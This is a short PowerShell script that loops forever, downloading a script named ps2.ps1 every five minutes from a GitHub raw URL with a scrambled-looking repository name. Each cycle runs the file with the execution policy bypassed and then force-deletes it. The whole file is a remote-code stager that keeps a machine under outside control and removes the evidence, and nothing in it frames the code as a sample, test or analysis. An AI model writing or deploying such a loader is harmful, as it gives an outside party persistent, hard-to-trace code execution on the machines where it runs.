$repoUrl = 'https://raw.githubusercontent.com/t0fum4n/-0-v94837-09273w54-068245-0v9-62450-69u-b2-4059y-bn3-240w568-3450-862054986-2034p245iuyu6po7iu29345w/main/ps2.ps1'
$filePath = "$env:USERPROFILE\Documents\ps2.ps1"

while ($true) {
    try {
        # Download ps2.ps1 from the GitHub repository
        Invoke-WebRequest -Uri $repoUrl -OutFile $filePath

        # Run the downloaded script
        powershell -ExecutionPolicy Bypass -File $filePath

        # Delete the script after running
        Remove-Item -Path $filePath -Force
    } catch {
        Write-Host "Error: $_"
    }

    # Wait for 300 seconds (5 minutes) before the next download
    Start-Sleep -Seconds 300
}
